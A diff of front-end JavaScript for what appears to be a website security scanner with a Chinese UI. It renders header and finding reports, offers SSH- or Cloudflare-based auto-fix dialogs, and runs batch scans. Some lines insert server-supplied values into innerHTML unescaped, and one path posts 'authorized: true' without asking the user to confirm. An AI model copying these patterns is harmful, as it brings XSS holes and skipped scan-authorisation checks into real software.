+  html += '<details style="margin-top:12px"><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 1：服务器实际响应头（点击展开）</summary>';
+  html += '<div style="margin-top:6px;background:#0f172a;color:#e2e8f0;border-radius:2px;padding:10px;font-family:monospace;font-size:12px;max-height:200px;overflow-y:auto" class="response-headers-list">';
+  presentHeaders.slice(0, 15).forEach(function(h) {
+    let v = String(headers[h]);
+    html += '<div class="response-header-row"><span style="color:#a5b4fc" class="response-header-name">' + h + '</span>: <span class="response-header-value">' + escapeHtml(v) + '</span></div>';
+  });
+  if (presentHeaders.length > 15) html += '<div style="color:#64748b;margin-top:4px">... 还有 ' + (presentHeaders.length - 15) + ' 个</div>';
+  html += '</div></details>';
+
+  // 真实证据 2: 缺失安全头
+  html += '<details style="margin-top:8px" open><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 2：缺失关键安全头（' + missingCritical.length + ' 个）</summary>';
+  if (missingCritical.length === 0) {
+    html += '<div style="margin-top:6px;padding:8px;font-size:12px;color:#73c990">关键安全头已全部配置</div>';
+  } else {
+    html += '<div style="margin-top:6px;padding:8px;font-size:12px">';
+    missingCritical.forEach(function(h) { html += '缺失: ' + h + '<br>'; });
+    html += '</div>';
+  }
+  html += '</details>';
+
+  // 真实证据 3: 敏感路径探测
+  html += '<details style="margin-top:8px"><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 3：敏感文件探测</summary>';
+  html += '<div style="margin-top:6px">' + sensitiveHtml + '</div></details>';
+
+  // 详细问题列表
+  if (findings.length > 0) {
+    html += '<details style="margin-top:8px" open><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">详细问题列表（' + findings.length + ' 项）</summary>';
+    html += '<div style="margin-top:6px;max-height:280px;overflow-y:auto">';
+    findings.forEach(function(f) {
+      let sevColor = f.severity === 'high' ? '#c75450' : f.severity === 'medium' ? '#f0a732' : '#4b6eaf';
+      let sevText = f.severity === 'high' ? '高' : f.severity === 'medium' ? '中' : '低';
+      // 兜底：fix 字段可能叫 recommendation
+      let fixText = f.fix || f.recommendation || '';
+      html += '<div data-finding-name="' + escapeHtml(f.name || '') + '" data-severity="' + (f.severity || 'low') + '" data-owasp="' + escapeHtml(f.owasp || '') + '" data-detail="' + escapeHtml(f.detail || '') + '" data-fix="' + escapeHtml(fixText) + '" style="padding:8px;margin-bottom:6px;border-left:3px solid ' + sevColor + ';background:var(--bg);border-radius:2px">';
+      html += '<div style="display:flex;align-items:center;justify-content:space-between;gap:6px"><div style="font-size:13px;font-weight:600">' + escapeHtml(f.name || '') + '</div>';
+      html += '<span style="font-size:11px;padding:2px 6px;border-radius:2px;background:' + sevColor + ';color:#fff">' + sevText + '</span>';
+      // 优先级标签
+      let priorityMap = { critical: 'P0', high: 'P1', medium: 'P2', low: 'P3' };
+      let priority = priorityMap[f.severity] || 'P3';
+      let priorityColors = { P0: '#c75450', P1: '#f0a732', P2: '#f0a732', P3: '#73c990' };
+      html += '<span style="font-size:11px;padding:2px 6px;border-radius:2px;background:#2b2b2b;color:' + priorityColors[priority] + ';font-weight:600;margin-left:6px;border:1px solid ' + priorityColors[priority] + '">' + priority + '</span></div>';
+      // 11-S: 代码层漏洞分类标签
+      let codeVulnTypes = ['sqli', 'xss', 'cmdi', 'traversal', 'deserialization', 'ssrf'];
+      if (codeVulnTypes.indexOf(f.type || '') >= 0) {
+        html += '<div style="margin-top:4px"><span style="font-size:11px;padding:2px 8px;border-radius:2px;background:#2b2b2b;color:#c75450;font-weight:600;border:1px solid #c75450">代码层漏洞</span></div>';
+      }
+      if (f.owasp) html += '<div style="font-size:11px;color:#a5b4fc;margin-top:2px">OWASP: ' + f.owasp + '</div>';
+      if (f.detail) html += '<div style="font-size:12px;color:var(--text-secondary);margin-top:4px">' + escapeHtml(f.detail) + '</div>';
+      if (f.recommendation) html += '<div style="font-size:12px;color:#73c990;margin-top:4px">建议：' + escapeHtml(f.recommendation) + '</div>';
+      // 修复方法代码（11-S: 真实修复建议直接显示）
+      if (fixText) {
+        html += '<details style="margin-top:6px"><summary style="cursor:pointer;font-size:12px;color:var(--primary);font-weight:600">修复建议</summary>';
+        html += '<pre style="margin-top:4px;padding:8px;background:#0f172a;color:#a7f3d0;border-radius:2px;font-size:12px;line-height:1.4;overflow-x:auto;white-space:pre-wrap;word-break:break-all">' + escapeHtml(fixText) + '</pre>';
+        html += '</details>';
+      }
+      // 11-S: 验证方法（增强版：显示三步验证法摘要）
+      if (fixText) {
+        if (f && f.verify_steps && f.verify_steps.length > 0) {
+          html += '<details style="margin-top:6px"><summary style="cursor:pointer;font-size:12px;color:var(--success);font-weight:600">如何验证修复</summary>';
+          html += '<div style="margin-top:6px;display:flex;flex-direction:column;gap:5px">';
+          f.verify_steps.forEach(function(step, idx) {
+            html += '<div style="font-size:11px;padding:5px 8px;background:#2b2b2b;border-radius:2px;border-left:2px solid #73c990">';
+            html += '<div style="font-weight:600;color:var(--text-primary)">第' + (idx+1) + '步：' + escapeHtml(step.method || '') + '</div>';
+            if (step.expect) {
+              html += '<div style="color:var(--text-secondary);margin-top:2px">预期：' + escapeHtml(step.expect) + '</div>';
+            }
+            html += '</div>';
+          });
+          html += '</div></details>';
+        } else {
+          html += '<div style="margin-top:6px;font-size:12px;color:var(--primary)">验证方法：修复后重新扫描该网站，查看此项是否消失或评分是否提升。</div>';
+        }
+      }
+      // 误报说明
+      html += '<div style="margin-top:4px;font-size:11px;color:var(--text-secondary)">说明：如认为此项为误报，可在修复建议中忽略。安全扫描可能存在误报，建议结合专业评估综合判断。</div>';
+      html += '</div>';
+    });
+    html += '</div></details>';
+  }
+
+  // 11-S：完整修复建议摘要（6 平台 tab，登录后展示）
+  if (d && d.fixes && Object.keys(d.fixes).length > 0) {
+    let fixPlatforms2 = d.fixes;
+    let platformNames2 = { nginx: 'Nginx', apache: 'Apache', express: 'Express', flask: 'Flask', spring_boot: 'Spring Boot', cloudflare: 'Cloudflare', python: 'Python', nodejs: 'Node.js' };
+    let platformOrder2 = ["nginx", "apache", "express", "flask", "spring_boot", "cloudflare", "nodejs", "python"];
+    let availableP2 = platformOrder2.filter(function(p) { return fixPlatforms2[p] && fixPlatforms2[p].length > 0 });
+    if (availableP2.length > 0) {
+      html += '<div style="margin-top:12px;padding:14px;border:1px solid #73c990;background:#2b2b2b;border-radius:2px">';
+      html += '<div style="font-size:14px;font-weight:600;margin-bottom:8px;color:#73c990">完整修复建议（' + availableP2.length + ' 种平台）</div>';
+      html += '<div style="display:flex;gap:4px;margin-bottom:10px;flex-wrap:wrap">';
+      availableP2.forEach(function(p, i) {
+        let active = i === 0;
+        html += '<button onclick="switchPublicFixTab(\'' + p + '\')" id="pub-fix-tab-' + p + '" style="padding:4px 10px;border-radius:2px;border:1px solid ' + (active ? 'var(--success)' : 'var(--border)') + ';background:' + (active ? 'var(--success)' : 'transparent') + ';color:' + (active ? '#fff' : 'var(--text-secondary)') + ';cursor:pointer;font-size:12px">' + platformNames2[p] + '</button>';
+      });
+      html += '</div>';
+      availableP2.forEach(function(p, i) {
+        let display = i === 0 ? 'block' : 'none';
+        let items2 = fixPlatforms2[p];
+        html += '<div id="pub-fix-pane-' + p + '" style="display:' + display + ';max-height:240px;overflow-y:auto;background:#2b2b2b;color:#bbbbbb;padding:10px;border-radius:2px;font-size:12px;line-height:1.5;border:1px solid #555555">';
+        items2.forEach(function(item, idx) {
+          let code = (typeof item === 'string') ? item : (item && item.code ? item.code : String(item));
+          html += '<div style="margin-bottom:8px;padding-bottom:8px;border-bottom:1px dashed #555555">';
+          html += '<div style="color:#808080;font-size:11px;margin-bottom:2px"># ' + (idx+1) + '</div>';
+          html += '<pre style="margin:0;white-space:pre-wrap;word-break:break-all">' + escapeHtml(code) + '</pre>';
+          html += '</div>';
+        });
+        html += '</div>';
+      });
+      html += '</div>';
+    }
+  }
+
+  // 操作按钮
+  html += '<div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">';
+  html += '<button onclick="navigateTo(\'fixer\')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">用 AI 修复器生成补丁</button>';
+  if (isLoggedIn()) {
+    html += '<button onclick="doPublicDemoFix()" style="background:var(--primary-dark,#4f46e5);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">生成修复配置并预览</button>';
+  } else {
+    html += '<button onclick="navigateTo(\'profile\')" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px">登录后获取修复配置</button>';
+  }
+  html += '</div>';
+
+  c.innerHTML = html;
+}
+
+function switchPublicFixTab(platform) {
+  // 隐藏所有 pane
+  document.querySelectorAll('[id^="pub-fix-pane-"]').forEach(function(el) { el.style.display = 'none'; });
+  // 显示选中的 pane
+  let pane = document.getElementById('pub-fix-pane-' + platform);
+  if (pane) pane.style.display = 'block';
+  // 切换 tab 样式
+  document.querySelectorAll('[id^="pub-fix-tab-"]').forEach(function(btn) {
+    btn.style.background = 'transparent';
+    btn.style.color = 'var(--text-secondary)';
+    btn.style.border = '1px solid var(--border)';
+  });
+  let tab = document.getElementById('pub-fix-tab-' + platform);
+  if (tab) {
+    tab.style.background = 'var(--success)';
+    tab.style.color = '#fff';
+    tab.style.border = '1px solid var(--success)';
+  }
+}
+
+async function doPublicDemoFix() {
+  // 从当前显示的报告里提取 findings
+  let c = document.getElementById('demo-content');
+  if (!c) return;
+  // 把当前试用扫描报告里所有 finding 名称都传给后端模拟修复
+  let findings = [];
+  c.querySelectorAll('[data-finding-name]').forEach(function(el) {
+    findings.push({
+      name: el.getAttribute('data-finding-name'),
+      severity: el.getAttribute('data-severity') || 'low',
+      owasp: el.getAttribute('data-owasp') || '',
+      detail: el.getAttribute('data-detail') || '',
+      fix: el.getAttribute('data-fix') || '',
+    });
+  });
+  if (findings.length === 0) {
+    showToast('没有发现需要修复的问题');
+    return;
+  }
+  // 11-S：先调用后端把试用扫描保存为用户的扫描记录
+  try {
+    if (isLoggedIn() && window._lastScanId) {
+      // 已经有 scan_id，不需要重新保存
+    } else if (isLoggedIn()) {
+      // 调用 /api/scan 把当前试用扫描报告保存为正式扫描记录
+      let url = document.getElementById('demo-host') ? document.getElementById('demo-host').value : 'https://example.com';
+      let sr = await authFetch('/api/scan', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ url: url, depth: 'standard', authorized: true })
+      });
+      if (sr.ok) {
+        let sd = await sr.json();
+        window._lastScanId = sd.scan_id;
+      }
+    }
+  } catch (e) {
+    // 忽略保存失败，继续模拟修复
+  }
+  // 调用后端模拟修复
+  try {
+    let fixPayload = { findings: findings };
+    // V11.4 fix: 传入 scan_id 以获取真实 before_score
+    if (window._lastScanId) {
+      fixPayload.scan_id = window._lastScanId;
+    }
+    let r = await authFetch('/api/simulate-fix', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(fixPayload)
+    });
+    let data = await r.json();
+    if (!r.ok) { showToast('生成修复配置失败'); return; }
+    renderFixComparison(data);
+  } catch (e) {
+    showToast('网络错误：' + (e.message || e));
+  }
+}
+
+function renderFixComparison(d) {
+  try {
+    let c = document.getElementById('demo-content');
+    if (!c) return;
+    if (!d || typeof d !== 'object') {
+      c.innerHTML = '<div class="card"><p style="color:var(--danger)">修复对比数据无效</p></div>';
+      return;
+    }
+    let html = '';
+  // 头部：返回
+  html += '<div style="display:flex;align-items:center;justify-content:space-between;margin-top:8px">';
+  html += '<h3 style="margin:0;font-size:16px">修复效果预览</h3>';
+  html += '<button onclick="loadPublicDemo()" style="background:none;border:1px solid var(--border);color:var(--text);padding:5px 12px;border-radius:2px;cursor:pointer;font-size:12px">← 返回报告</button>';
+  html += '</div>';
+  // 总结
+  html += '<div style="background:#3c3f41,rgba(75,110,175,0.08));border:1px solid rgba(16,185,129,0.3);border-radius:2px;padding:14px;margin-top:12px">';
+  html += '<div style="font-size:14px;font-weight:600;color:#73c990">' + d.summary + '</div>';
+  html += '</div>';
+  // 评分对比
+  html += '<div style="display:grid;grid-template-columns:1fr auto 1fr;gap:12px;align-items:center;margin-top:14px">';
+  html += '<div style="text-align:center;background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:14px">';
+  html += '<div style="font-size:12px;color:var(--text-secondary)">修复前</div>';
+  html += '<div style="font-size:36px;font-weight:700;color:#c75450;margin-top:4px">' + d.before_score + '</div>';
+  html += '</div>';
+  html += '<div style="text-align:center;color:#73c990;font-size:24px;font-weight:700">→</div>';
+  html += '<div style="text-align:center;background:rgba(16,185,129,0.08);border:2px solid #73c990;border-radius:2px;padding:14px">';
+  html += '<div style="font-size:12px;color:#73c990">修复后</div>';
+  html += '<div style="font-size:36px;font-weight:700;color:#73c990;margin-top:4px">' + d.after_score + '</div>';
+  html += '<div style="font-size:12px;color:#73c990;margin-top:2px">+ ' + d.delta + ' 分</div>';
+  html += '</div>';
+  html += '</div>';
+  // 修复列表
+  html += '<h4 style="font-size:14px;margin:14px 0 8px">修复项清单（' + d.fixed_count + ' 项）</h4>';
+  html += '<div style="max-height:300px;overflow-y:auto">';
+  d.fixed_items.forEach(function(f, i) {
+    let sevColor = f.severity === 'high' ? '#c75450' : f.severity === 'medium' ? '#f0a732' : '#4b6eaf';
+    let sevText = f.severity === 'high' ? '高' : f.severity === 'medium' ? '中' : '低';
+    html += '<div style="display:flex;align-items:flex-start;gap:8px;padding:8px;margin-bottom:6px;background:var(--bg);border-radius:2px;border-left:3px solid ' + sevColor + '">';
+    html += '<div style="font-size:14px;font-weight:600;color:#73c990;min-width:24px">' + (i+1) + '.</div>';
+    html += '<div style="flex:1"><div style="display:flex;align-items:center;gap:6px"><span style="font-size:12px;font-weight:600">' + escapeHtml(f.name || '') + '</span>';
+    html += '<span style="font-size:11px;padding:1px 5px;border-radius:2px;background:' + sevColor + ';color:#fff">' + sevText + '</span>';
+    if (f.owasp) html += '<span style="font-size:11px;color:#a5b4fc">' + escapeHtml(f.owasp) + '</span>';
+    html += '</div>';
+    if (f.fix) html += '<div style="font-size:12px;color:var(--text-secondary);margin-top:4px;font-family:monospace;background:#0f172a;color:#e2e8f0;padding:6px;border-radius:2px;overflow-x:auto;white-space:pre">' + escapeHtml(f.fix).substring(0, 200) + '</div>';
+    html += '</div></div>';
+  });
+  html += '</div>';
+  // 操作
+  html += '<div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">';
+  if (isLoggedIn()) {
+    html += '<button onclick="navigateTo(\'fixer\')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">进入修复器获取完整补丁</button>';
+    // 11-S 新增：自动修复按钮
+    html += '<button onclick="showAutoFixDialog(\'' + (window._lastScanId || '') + '\', ' + (d.fixed_count || 0) + ')" style="background:#73c990;color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">应用修复</button>';
+  } else {
+    html += '<button onclick="navigateTo(\'profile\')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">登录后获取完整补丁代码</button>';
+  }
+  html += '</div>';
+  c.innerHTML = html;
+  } catch (e) {
+    console.error('renderFixComparison error:', e);
+    let c = document.getElementById('demo-content');
+    if (c) c.innerHTML = '<div class="card"><p style="color:var(--danger)">渲染修复对比失败: ' + escapeHtml(e.message || String(e)) + '</p></div>';
+  }
+}
+
+// ============== 11-S 自动修复对话框 ==============
+function showAutoFixDialog(scanId, fixCount) {
+  try {
+  // 防止重复打开
+  if (document.getElementById('auto-fix-dialog')) return;
+  if (!scanId) {
+    showToast('请先完成一次扫描');
+    return;
+  }
+  let html = '';
+  html += '<div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px" onclick="if(event.target===this)closeAutoFixDialog()">';
+  html += '<div style="background:var(--surface);border-radius:2px;max-width:540px;width:100%;padding:22px;box-shadow:0 20px 60px rgba(0,0,0,0.4)">';
+
+  // 标题
+  html += '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">';
+  html += '<h3 style="margin:0;font-size:18px">生成修复配置 ' + fixCount + ' 项问题</h3>';
+  html += '<button onclick="closeAutoFixDialog()" style="background:none;border:none;font-size:22px;cursor:pointer;color:var(--text-secondary)">×</button>';
+  html += '</div>';
+
+  // 说明
+  html += '<div style="background:rgba(75,110,175,0.08);border:1px solid rgba(75,110,175,0.3);border-radius:2px;padding:12px;margin-bottom:16px;font-size:12px;color:var(--text-secondary)">';
+  html += '<b>安全说明</b>：凭证仅在本请求中使用，不保存到数据库。<br>';
+  html += '<b>修复流程</b>：连接 → 备份 → 写配置 → nginx -t 测试 → reload → 验证头<br>';
+  html += '<b>失败回滚</b>：如 nginx -t 失败，自动停止不会 reload<br>';
+  html += '<b>零停机</b>：用 reload 而非 restart';
+  html += '</div>';
+
+  // 平台选择
+  html += '<div style="margin-bottom:14px">';
+  html += '<label style="font-size:13px;font-weight:600;display:block;margin-bottom:8px">修复方式</label>';
+  html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">';
+  html += '<label style="background:var(--bg);border:2px solid var(--primary);border-radius:2px;padding:10px;cursor:pointer;text-align:center" id="opt-ssh">';
+  html += '<input type="radio" name="auto-fix-method" value="ssh" checked style="display:none">';
+  html += '<div style="font-size:20px;color:var(--text-secondary)">SSH</div>';
+  html += '<div style="font-size:12px;font-weight:600;margin-top:4px">SSH 登录服务器</div>';
+  html += '<div style="font-size:11px;color:var(--text-secondary)">需服务器 SSH 账号</div>';
+  html += '</label>';
+  html += '<label style="background:var(--bg);border:2px solid var(--border);border-radius:2px;padding:10px;cursor:pointer;text-align:center" id="opt-cf">';
+  html += '<input type="radio" name="auto-fix-method" value="cloudflare" style="display:none">';
+  html += '<div style="font-size:20px;color:var(--text-secondary)">CF</div>';
+  html += '<div style="font-size:12px;font-weight:600;margin-top:4px">Cloudflare API</div>';
+  html += '<div style="font-size:11px;color:var(--text-secondary)">只需 API Token</div>';
+  html += '</label>';
+  html += '</div>';
+  html += '</div>';
+
+  // SSH 表单
+  html += '<div id="ssh-form">';
+  html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">';
+  html += '<div><label style="font-size:12px;color:var(--text-secondary)">服务器 IP/域名</label><input id="af-host" type="text" placeholder="192.168.1.100" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>';
+  html += '<div><label style="font-size:12px;color:var(--text-secondary)">SSH 端口</label><input id="af-port" type="number" value="22" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>';
+  html += '</div>';
+  html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">';
+  html += '<div><label style="font-size:12px;color:var(--text-secondary)">SSH 用户名</label><input id="af-user" type="text" value="root" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>';
+  html += '<div><label style="font-size:12px;color:var(--text-secondary)">平台</label><select id="af-platform" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"><option value="nginx">Nginx</option><option value="apache">Apache</option></select></div>';
+  html += '</div>';
+  html += '<div style="margin-bottom:12px"><label style="font-size:12px;color:var(--text-secondary)">SSH 密码 <span style="color:#c75450">*（仅本次使用，不保存）</span></label><input id="af-pass" type="password" placeholder="••••••" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>';
+  html += '</div>';
+
+  // Cloudflare 表单（默认隐藏）
+  html += '<div id="cf-form" style="display:none">';
+  html += '<div style="margin-bottom:8px"><label style="font-size:12px;color:var(--text-secondary)">Cloudflare API Token</label><input id="af-cf-token" type="password" placeholder="CF Token" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>';
+  html += '<div style="margin-bottom:12px"><label style="font-size:12px;color:var(--text-secondary)">Zone（域名，如 example.com）</label><input id="af-cf-zone" type="text" placeholder="example.com" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>';
+  html += '</div>';
+
+  // 确认按钮
+  html += '<button onclick="executeAutoFix(\'' + scanId + '\')" style="width:100%;background:#73c990;color:#fff;border:none;padding:12px;border-radius:2px;cursor:pointer;font-size:14px;font-weight:600;margin-top:8px">生成修复配置并复测</button>';
+
+  // 结果区
+  html += '<div id="af-result" style="margin-top:14px"></div>';
+
+  html += '</div></div>';
+
+  // 创建对话框
+  let d = document.createElement('div');
+  d.id = 'auto-fix-dialog';
+  d.innerHTML = html;
+  document.body.appendChild(d);
+
+  // 切换表单
+  setTimeout(function() {
+    let radios = document.querySelectorAll('input[name="auto-fix-method"]');
+    radios.forEach(function(r) {
+      r.addEventListener('change', function() {
+        let ssh = document.getElementById('ssh-form');
+        let cf = document.getElementById('cf-form');
+        let optSsh = document.getElementById('opt-ssh');
+        let optCf = document.getElementById('opt-cf');
+        if (this.value === 'ssh') {
+          ssh.style.display = 'block';
+          cf.style.display = 'none';
+          optSsh.style.borderColor = 'var(--primary)';
+          optCf.style.borderColor = 'var(--border)';
+        } else {
+          ssh.style.display = 'none';
+          cf.style.display = 'block';
+          optSsh.style.borderColor = 'var(--border)';
+          optCf.style.borderColor = 'var(--primary)';
+        }
+      });
+    });
+  }, 50);
+  } catch (e) {
+    console.error('showAutoFixDialog error:', e);
+    showToast('打开修复配置对话框失败: ' + (e.message || String(e)), 'error');
+  }
+}
+
+function closeAutoFixDialog() {
+  let d = document.getElementById('auto-fix-dialog');
+  if (d) d.remove();
+}
+
+async function executeAutoFix(scanId) {
+  let methodRadio = document.querySelector('input[name="auto-fix-method"]:checked');
+  if (!methodRadio) { showToast('请选择修复方式', 'error'); return; }
+  let method = methodRadio.value;
+  let result = document.getElementById('af-result');
+  if (!result) return;
+  result.innerHTML = '<div style="background:var(--bg);border-radius:2px;padding:12px;font-size:12px;color:var(--text-secondary)">正在连接服务器并执行修复，请稍候...</div>';
+
+  try {
+    let body = { scan_id: scanId };
+    if (method === 'ssh') {
+      body.credentials = {
+        host: document.getElementById('af-host').value.trim(),
+        port: parseInt(document.getElementById('af-port').value) || 22,
+        username: document.getElementById('af-user').value.trim() || 'root',
+        password: document.getElementById('af-pass').value,
+        platform: document.getElementById('af-platform').value,
+      };
+      if (!body.credentials.host || !body.credentials.password) {
+        result.innerHTML = '<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px;color:#c75450">错误：请填写服务器 IP 和密码</div>';
+        return;
+      }
+    } else {
+      body.cf_token = document.getElementById('af-cf-token').value.trim();
+      body.cf_zone = document.getElementById('af-cf-zone').value.trim();
+      if (!body.cf_token || !body.cf_zone) {
+        result.innerHTML = '<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px;color:#c75450">错误：请填写 CF Token 和 Zone</div>';
+        return;
+      }
+    }
+
+    let url = method === 'ssh' ? '/api/auto-fix' : '/api/auto-fix-via-cloudflare';
+    let r = await authFetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body),
+    });
+    let data = await r.json();
+
+    if (!r.ok || !data.success) {
+      result.innerHTML = '<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px"><b>修复失败</b><br><pre style="margin:6px 0 0;font-size:12px;white-space:pre-wrap">' + escapeHtml(JSON.stringify(data, null, 2)) + '</pre></div>';
+      return;
+    }
+
+    // 成功
+    let html = '<div style="background:rgba(16,185,129,0.1);border:1px solid #73c990;border-radius:2px;padding:12px">';
+    html += '<div style="font-size:14px;font-weight:600;color:#73c990;margin-bottom:8px">修复成功</div>';
+    if (data.host) html += '<div style="font-size:12px;color:var(--text-secondary)">服务器: ' + escapeHtml(data.host) + '</div>';
+    if (data.config_path) html += '<div style="font-size:12px;color:var(--text-secondary)">配置: ' + escapeHtml(data.config_path) + ' (' + data.patch_size_bytes + ' 字节)</div>';
+    if (data.config_test_ok !== undefined) {
+      html += '<div style="font-size:12px;color:' + (data.config_test_ok ? '#73c990' : '#c75450') + '">nginx -t: ' + (data.config_test_ok ? '配置合法' : '配置错误，已停止 reload') + '</div>';
+    }
+    if (data.verified_headers && data.verified_headers.length > 0) {
+      html += '<div style="font-size:12px;font-weight:600;margin-top:8px">已验证的安全头：</div>';
+      data.verified_headers.slice(0, 6).forEach(function(h) {
+        html += '<div style="font-size:11px;font-family:monospace;background:#0f172a;color:#73c990;padding:4px;border-radius:3px;margin-top:2px">' + escapeHtml(h) + '</div>';
+      });
+    }
+    if (data.applied !== undefined) {
+      html += '<div style="font-size:12px;margin-top:8px">Cloudflare: ' + data.applied + '/' + data.total + ' 头已应用</div>';
+    }
+    html += '<button onclick="closeAutoFixDialog();loadHistory&&loadHistory()" style="width:100%;margin-top:10px;background:var(--primary);color:#fff;border:none;padding:8px;border-radius:2px;cursor:pointer;font-size:12px">完成</button>';
+    html += '</div>';
+    result.innerHTML = html;
+    showToast('修复配置已应用。已验证 ' + (data.verified_headers ? data.verified_headers.length : 0) + ' 个安全头');
+  } catch (e) {
+    result.innerHTML = '<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px">错误：网络错误: ' + escapeHtml(e.message || String(e)) + '</div>';
+  }
+}
+
+function askAIQuick(q) {
+  let inp = document.getElementById('ai-input');
+  if (inp) inp.value = q;
+  sendAIMessage();
+}
+
+function askAI(msg) {
+    let input = document.getElementById('ai-input');
+    if (input) { input.value = msg; }
+    sendAIMessage();
+}
+
+// ===== Batch Scan =====
+function showBatchScanModal() {
+  if (!isLoggedIn()) { showToast('请先登录'); navigateTo('profile'); return; }
+  let modal = document.getElementById('batch-scan-modal');
+  if (modal) modal.style.display = 'flex';
+  let res = document.getElementById('batch-results');
+  if (res) res.innerHTML = '';
+}
+function closeBatchScanModal() {
+  let modal = document.getElementById('batch-scan-modal');
+  if (modal) modal.style.display = 'none';
+}
+async function doBatchScan() {
+  let txt = (document.getElementById('batch-urls').value || '').trim();
+  if (!txt) { showToast('请输入至少 1 个 URL'); return; }
+  let urls = txt.split(/\r?\n/).map(function(s){return s.trim();}).filter(Boolean);
+  if (urls.length > 5) { showToast('最多 5 个 URL'); return; }
+  // 批量扫描授权确认检查
+  let batchAuth = document.getElementById('batch-auth-check');
+  if (!batchAuth || !batchAuth.checked) {
+    showToast('请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。');
+    return;
+  }
+  let deepEl = document.getElementById('batch-deep');
+  let deep = deepEl ? deepEl.checked : false;
+  let btn = document.getElementById('batch-go-btn');
+  if (btn) { btn.disabled = true; btn.textContent = '扫描中…'; }
+  let res = document.getElementById('batch-results');
+  if (!res) { if (btn) { btn.disabled = false; btn.textContent = '开始批量扫描'; } return; }
+  res.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-secondary);font-size:13px">正在扫描 ' + urls.length + ' 个目标…</div>';
+  try {
+    let r = await authFetch('/api/batch-scan', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ urls: urls, deep: deep, authorized: true })
+    });
+    let data = await r.json();
+    if (!r.ok) { res.innerHTML = '<div style="color:#c75450;padding:10px">错误：' + escapeHtml(friendlyError(extractError(data))) + '</div>'; return; }
+    let html = '<div style="font-size:13px;font-weight:600;margin-bottom:8px">扫描完成 · ' + data.count + ' 个目标</div>';
+    data.results.forEach(function(item, i) {
+      let color = item.ok ? (item.score >= 80 ? '#73c990' : item.score >= 50 ? '#f0a732' : '#c75450') : '#808080';
+      let bg = item.ok ? (item.score >= 80 ? 'rgba(16,185,129,0.1)' : item.score >= 50 ? 'rgba(240,167,50,0.1)' : 'rgba(199,84,80,0.1)') : 'rgba(156,163,175,0.1)';
+      html += '<div style="background:' + bg + ';border-radius:2px;padding:10px;margin-bottom:8px;display:flex;align-items:center;justify-content:space-between;gap:10px">';
+      html += '<div style="flex:1;min-width:0">';
+      html += '<div style="font-size:12px;color:var(--text-secondary);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">' + (i+1) + '. ' + item.url + '</div>';
+      if (item.ok) {
+        html += '<div style="font-size:12px;color:var(--text-secondary);margin-top:3px">高 ' + item.high + ' · 中 ' + item.medium + ' · 低 ' + item.low + '</div>';
+      } else {
+        html += '<div style="font-size:12px;color:#c75450;margin-top:3px">错误：' + (item.error || '失败') + '</div>';
+      }
+      html += '</div>';
+      if (item.ok) {
+        html += '<div style="font-size:20px;font-weight:700;color:' + color + '">' + item.score + '</div>';
+      } else {
+        html += '<div style="font-size:12px;color:#808080">-</div>';
+      }
+      html += '</div>';
+    });
+    res.innerHTML = html;
+    showToast('批量扫描完成');
+  } catch (e) {
+    res.innerHTML = '<div style="color:#c75450;padding:10px">网络错误：' + (e.message || e) + '</div>';
+  } finally {
+    if (btn) { btn.disabled = false; btn.textContent = '开始批量扫描'; }
+  }
+}
+
+// Utility
+function getHost(url) {
+  try {
+    if (!/^https?:\/\//i.test(url)) url = 'http://' + url;
+    let u = new URL(url);
+    return u.hostname;
+  } catch(e) {
+    return url.replace(/^https?:\/\//i, '').split('/')[0];
+  }
+}
+
